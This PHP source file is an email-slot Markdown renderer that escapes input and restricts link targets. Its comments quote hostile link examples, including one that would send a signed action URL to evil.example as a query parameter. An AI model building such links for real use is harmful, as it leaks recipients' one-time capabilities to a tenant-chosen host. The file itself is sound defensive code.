<?php

// SPDX-FileCopyrightText: 2026 The DocUp contributors
// SPDX-License-Identifier: Apache-2.0

declare(strict_types=1);

namespace App\Branding\Email;

use App\Branding\Chrome\SafeHref;
use App\Branding\TokenRefused;
use App\Branding\TokenRejection;

/**
 * 🛑 §8.14.13's "Markdown with HTML disabled, substituted over a pre-escaped
 * variable map".
 *
 * ## Why DocUp writes its own three-construct renderer
 *
 * The obvious move is a Markdown library. Every one worth using supports raw
 * HTML passthrough, and every one makes disabling it a configuration flag —
 * which means the security property is one array key away from being lost, in a
 * dependency that gets updated. §18.22's lesson about CSS parsers is the same
 * lesson: a parser is a liability when its safe behaviour is an option.
 *
 * So this renders **three** constructs and refuses everything else to be text:
 * emphasis, a link, and a paragraph break. That is what an email slot needs,
 * and there is no mode in which it emits a tag DocUp did not write.
 *
 * ## 🛑 The variable map is substituted *after* escaping and *after* rendering
 *
 * §8.14.13's phrase is "substituted over a **pre-escaped** variable map", and
 * the ordering is the requirement. A variable's value is escaped when the map is
 * built and the placeholder is replaced in the finished HTML — so a project
 * named `<script>` arrives as `&lt;script&gt;` and cannot become a tag, and a
 * tenant's slot text cannot introduce a placeholder that picks up a variable
 * they were not given: substitution runs once, over a fixed key set.
 *
 * ## What is refused rather than escaped
 *
 * A link whose target is not `http`, `https` or `mailto`. An email is the one
 * surface where a tenant's text is delivered to a reader's inbox over DocUp's
 * reputation, so a `javascript:` or `data:` link is refused at the grammar
 * rather than left for a mail client to decide about.
 */
final class SlotMarkdown
{
    /** Placeholders a slot may name: `{project}`, `{reader}`, and so on. */
    private const PLACEHOLDER = '/\{([a-z][a-z0-9_]{0,30})\}/';

    /**
     * Render one slot to the HTML an email body carries.
     *
     * @param  string  $path  for the rejection
     * @param  list<string>  $variables  the placeholder names this slot may use
     *
     * @throws TokenRefused
     */
    public static function render(string $markdown, string $path, int $maxCharacters, array $variables = []): string
    {
        $normalised = self::normalise($markdown, $path, $maxCharacters);

        self::assertPlaceholdersKnown($normalised, $path, $variables);

        $paragraphs = preg_split('/\n{2,}/', $normalised) ?: [];
        $rendered = [];

        foreach ($paragraphs as $paragraph) {
            $paragraph = trim($paragraph);

            if ($paragraph === '') {
                continue;
            }

            $rendered[] = '<p>'.self::inline($paragraph, $path).'</p>';
        }

        return implode("\n", $rendered);
    }

    /**
     * Validate a slot without rendering it, for a draft save.
     *
     * @param  list<string>  $variables
     *
     * @throws TokenRefused
     */
    public static function assertValid(string $markdown, string $path, int $maxCharacters, array $variables = []): string
    {
        self::render($markdown, $path, $maxCharacters, $variables);

        return self::normalise($markdown, $path, $maxCharacters);
    }

    /**
     * 🛑 Substitute a pre-escaped variable map into rendered HTML.
     *
     * The map's values are escaped by the caller that built it
     * ({@see EmailVariables}), which is the only place that knows what each
     * value is. Doing it here would mean escaping a value that may already have
     * been escaped — and double-escaping a project name is how `&amp;amp;`
     * reaches a reader.
     *
     * @param  array<string, string>  $escaped
     */
    public static function substitute(string $html, array $escaped): string
    {
        return (string) preg_replace_callback(
            self::PLACEHOLDER,
            static fn (array $match): string => $escaped[$match[1]] ?? $match[0],
            $html,
        );
    }

    /** @throws TokenRefused */
    private static function normalise(string $markdown, string $path, int $maxCharacters): string
    {
        if (! mb_check_encoding($markdown, 'UTF-8')) {
            throw TokenRefused::of(TokenRejection::TextRefused, $path, 'not valid UTF-8');
        }

        if (mb_strlen($markdown) > $maxCharacters) {
            throw TokenRefused::of(
                TokenRejection::TextRefused,
                $path,
                sprintf('%d characters; the limit is %d', mb_strlen($markdown), $maxCharacters),
            );
        }

        /* Line endings normalised so a paragraph break means one thing. */
        $normalised = str_replace(["\r\n", "\r"], "\n", $markdown);

        if (preg_match('/[\x00-\x08\x0B\x0C\x0E-\x1F]/u', $normalised) === 1) {
            throw TokenRefused::of(TokenRejection::TextRefused, $path, 'a control character');
        }

        return trim($normalised);
    }

    /**
     * 🛑 A placeholder this slot was not given is a refusal, not a passthrough.
     *
     * An operator who wrote `{reader_email}` in a slot whose map has no such
     * key would otherwise send an email containing the literal text
     * `{reader_email}` to every recipient — and would find out from a recipient.
     *
     * @param  list<string>  $variables
     *
     * @throws TokenRefused
     */
    private static function assertPlaceholdersKnown(string $markdown, string $path, array $variables): void
    {
        if (preg_match_all(self::PLACEHOLDER, $markdown, $matches) === 0) {
            return;
        }

        foreach ($matches[1] as $name) {
            if (! in_array($name, $variables, true)) {
                throw TokenRefused::of(
                    TokenRejection::UnknownEmailSlot,
                    $path,
                    sprintf(
                        '{%s} is not available here; this slot offers %s',
                        $name,
                        $variables === [] ? 'no placeholders' : '{'.implode('}, {', $variables).'}',
                    ),
                );
            }
        }
    }

    /**
     * The three inline constructs, over escaped text.
     *
     * 🛑 The text is escaped **first** and the three constructs are then
     * matched over the escaped string. That ordering is what makes HTML
     * disabled rather than filtered: by the time any pattern runs, every `<`
     * in the input is already `&lt;`, so there is no input that can produce a
     * tag this function did not write.
     *
     * @throws TokenRefused
     */
    private static function inline(string $text, string $path): string
    {
        $escaped = htmlspecialchars($text, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');

        /* A single newline inside a paragraph is a line break. */
        $escaped = str_replace("\n", "<br>\n", $escaped);

        /*
         * Links first, so emphasis inside a link label works and a `*` in a
         * URL is not read as emphasis.
         */
        $withLinks = preg_replace_callback(
            '/\[([^\]]{1,120})\]\(([^)\s]{1,2048})\)/',
            static function (array $match) use ($path): string {
                $href = self::linkTarget(html_entity_decode($match[2], ENT_QUOTES, 'UTF-8'), $path);

                return sprintf(
                    '<a href="%s">%s</a>',
                    htmlspecialchars($href, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'),
                    $match[1],
                );
            },
            $escaped,
        );

        $escaped = $withLinks ?? $escaped;

        /* Bold then italic, longest delimiter first. */
        $escaped = (string) preg_replace('/\*\*([^*]{1,200})\*\*/', '<strong>$1</strong>', $escaped);

        return (string) preg_replace('/(?<![*\w])\*([^*]{1,200})\*(?![*\w])/', '<em>$1</em>', $escaped);
    }

    /**
     * 🛑 `http`, `https` or `mailto`, and nothing else.
     *
     * `mailto:` is admitted here and refused in chrome ({@see SafeHref} says
     * why there). The difference is the medium: an email that cannot offer a
     * reply address is an email whose recipient has no way to answer, and a
     * `mailto:` in a mail client does not navigate an origin.
     *
     * @throws TokenRefused
     */
    private static function linkTarget(string $href, string $path): string
    {
        $href = trim($href);

        /*
         * 🛑 A link target that is **exactly one placeholder** is admitted, and
         * this is the case §8.14.13 is for: "Your build finished.
         * [See it]({action_url})" is the single most natural thing an operator
         * writes in the intro slot, and the first version of this method
         * refused it — which would have left `{action_url}` usable only as
         * visible text, printing a URL at the reader instead of linking it.
         *
         * It is also the *safest* target in the grammar, which is the part
         * worth being precise about. The value does not come from the tenant:
         * it comes from {@see EmailVariables::escape()}, which the sending code
         * builds from DocUp's own data and escapes once. The tenant chooses
         * only *which* of the names their slot is offered, and
         * {@see self::assertPlaceholdersKnown()} refuses one it was not.
         *
         * 🛑 **Exactly one, and nothing around it.** The anchor and the
         * terminator are the whole control: `javascript:{action_url}` and
         * `{action_url}@evil.example` are both refused by the next branch,
         * because a placeholder that could be a *fragment* of a target would
         * let a tenant build a URL out of DocUp's own value.
         */
        if (preg_match('/^\{[a-z][a-z0-9_]{0,30}\}$/', $href) === 1) {
            return $href;
        }

        /*
         * 🛑 A placeholder **inside** a target is refused, and this is a real
         * disclosure control rather than tidiness.
         *
         * `[Confirm](https://evil.example/?u={action_url})` is a perfectly
         * valid `https://` URL, so the shape rules below accept it — and
         * substitution would then deliver DocUp's own action URL to a host the
         * tenant chose. An action URL is a **capability**: a signed, one-time
         * link that does something on the recipient's behalf. Handing it to a
         * tenant's server is handing them that capability for every email
         * DocUp sends on their behalf.
         *
         * Found by the test that asserted a placeholder may be a whole target;
         * four of its five hostile spellings were refused by the shape rules
         * and this one was not.
         *
         * A placeholder in the link **text** is still fine — it is text — and
         * so is one anywhere in a paragraph. It is only a target that confers
         * anything.
         */
        if (preg_match(self::PLACEHOLDER, $href) === 1) {
            throw TokenRefused::of(
                TokenRejection::UnsafeLinkTarget,
                $path,
                'a placeholder may be a whole link target or none of one; '
                .'substituting one into a URL would send DocUp’s own value to that host',
            );
        }

        if (preg_match('/^mailto:[^\s<>"\']{3,254}$/i', $href) === 1) {
            return $href;
        }

        /*
         * Everything else goes through chrome's own rule, which refuses
         * control characters, protocol-relative URLs and every scheme that is
         * not http(s). One implementation, two callers.
         */
        return SafeHref::parse($href, $path);
    }
}
